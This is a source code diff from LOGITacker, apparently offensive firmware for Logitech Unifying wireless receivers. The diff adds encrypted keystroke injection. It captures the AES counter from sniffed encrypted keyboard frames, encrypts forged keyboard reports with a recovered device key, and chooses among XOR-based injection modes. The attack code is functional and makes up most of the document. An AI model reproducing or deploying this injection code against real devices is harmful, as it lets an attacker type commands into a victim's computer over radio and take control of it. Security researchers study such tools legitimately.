@@ -5,6 +5,7 @@
 #define NRF_LOG_MODULE_NAME LOGITACKER_DEVICES
 #include "nrf_log.h"
 #include "logitacker_flash.h"
+#include "logitacker_unifying_crypto.h"
 
 NRF_LOG_MODULE_REGISTER();
 
@@ -667,6 +668,8 @@ uint32_t logitacker_devices_device_update_classification(logitacker_devices_unif
             if (len != 22) return NRF_ERROR_INVALID_DATA;
             p_device->caps |= LOGITACKER_DEVICE_CAPS_LINK_ENCRYPTION;
             p_device->report_types |= LOGITACKER_DEVICE_REPORT_TYPES_KEYBOARD;
+
+            unifying_extract_counter_from_encrypted_keyboard_frame(frame, &p_device->last_used_aes_ctr);
             break;
 
         case UNIFYING_RF_REPORT_HIDPP_LONG:
@@ -771,26 +774,53 @@ uint32_t logitacker_devices_generate_keyboard_frame_plain(nrf_esb_payload_t *p_r
     return NRF_SUCCESS;
 }
 
-uint32_t logitacker_devices_generate_keyboard_frame_encrypted(logitacker_devices_unifying_device_t const *const p_caps,
+uint32_t logitacker_devices_generate_keyboard_frame_encrypted(logitacker_devices_unifying_device_t * const p_device,
                                                               nrf_esb_payload_t *p_result_payload,
                                                               hid_keyboard_report_t const *const p_in_hid_report) {
-    NRF_LOG_WARNING("Encrypted injection not implemented, yet");
-    return NRF_ERROR_INVALID_PARAM;
+    /*
+     *   len: 22
+     *   0x00       : dev ID
+     *   0x01       : report type (0xd3 = encrypted keyboard + keep alive)
+     *   0x02..0x09 : keyboard payload encrypted (last byte 0xC9)
+     *   0x09..0x0c : Logitech CRC
+     *
+     *   example: 00 D3 96 70 86 B9 CF 52 AE 75 9C D1 7D 5B 00 00 00 00 00 00 00 5F
+     */
+
+    uint8_t plain_payload[8];
+    plain_payload[0] = p_in_hid_report->mod;
+    for (int i=0; i<6; i++) plain_payload[i+1] = p_in_hid_report->keys[i];
+    plain_payload[7] = 0xC9;
+
+    uint8_t key[16] = {0};
+    memcpy(key, p_device->key, 16); // key is const, thus we need a copy
+
+    uint32_t res = logitacker_unifying_crypto_encrypt_keyboard_frame(p_result_payload, plain_payload, key,
+                                                             p_device->last_used_aes_ctr);
+
+    if (res == NRF_SUCCESS) p_device->last_used_aes_ctr++;
+    return res;
 }
 
-uint32_t logitacker_devices_generate_keyboard_frame(logitacker_devices_unifying_device_t *p_caps,
+uint32_t logitacker_devices_generate_keyboard_frame(logitacker_devices_unifying_device_t *p_device,
                                                     nrf_esb_payload_t *p_result_payload,
                                                     hid_keyboard_report_t const *const p_in_hid_report) {
     keyboard_report_gen_mode_t mode = KEYBOARD_REPORT_GEN_MODE_PLAIN;
 
-    if (p_caps != NULL) {
-        if (p_caps->is_encrypted) {
-            if (p_caps->key_known) {
+    VERIFY_PARAM_NOT_NULL(p_device);
+    VERIFY_PARAM_NOT_NULL(p_result_payload);
+    VERIFY_PARAM_NOT_NULL(p_in_hid_report);
+
+    bool is_encrypted = (p_device->caps & LOGITACKER_DEVICE_CAPS_LINK_ENCRYPTION) != 0;
+
+    if (p_device != NULL) {
+        if (is_encrypted) {
+            if (p_device->key_known) {
                 mode = KEYBOARD_REPORT_GEN_MODE_ENCRYPTED;
             } else {
-                if (p_caps->has_enough_whitened_reports) {
+                if (p_device->has_enough_whitened_reports) {
                     mode = KEYBOARD_REPORT_GEN_MODE_ENCRYPTED_XOR;
-                } else if (p_caps->has_single_whitened_report) {
+                } else if (p_device->has_single_whitened_report) {
                     mode = KEYBOARD_REPORT_GEN_MODE_ENCRYPTED_XOR_SINGLE;
                 } else {
                     NRF_LOG_WARNING("No proper key injection mode for device, fallback to PLAIN injection");
@@ -805,9 +835,11 @@ uint32_t logitacker_devices_generate_keyboard_frame(logitacker_devices_unifying_
 
     switch (mode) {
         case KEYBOARD_REPORT_GEN_MODE_PLAIN:
+            NRF_LOG_INFO("GENERATING PLAIN KEYBOARD FRAME");
             return logitacker_devices_generate_keyboard_frame_plain(p_result_payload, p_in_hid_report);
         case KEYBOARD_REPORT_GEN_MODE_ENCRYPTED:
-            return logitacker_devices_generate_keyboard_frame_encrypted(p_caps, p_result_payload, p_in_hid_report);
+            NRF_LOG_INFO("GENERATING ENCRYPTED KEYBOARD FRAME");
+            return logitacker_devices_generate_keyboard_frame_encrypted(p_device, p_result_payload, p_in_hid_report);
         default:
             return logitacker_devices_generate_keyboard_frame_plain(p_result_payload, p_in_hid_report);
     }
